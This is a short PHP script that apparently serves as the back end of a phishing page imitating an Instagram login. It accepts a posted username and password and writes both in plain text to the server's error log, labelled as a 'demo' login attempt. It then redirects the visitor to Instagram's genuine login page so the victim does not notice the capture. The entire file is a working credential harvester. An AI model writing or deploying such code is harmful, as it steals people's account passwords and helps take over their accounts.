if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    error_log("Demo login attempt - Username: $username, Password: $password");

  
    header("Location: https://www.instagram.com/accounts/login/?hl=en");
    exit();
} else {
  
    echo "This endpoint accepts POST requests only.";
}
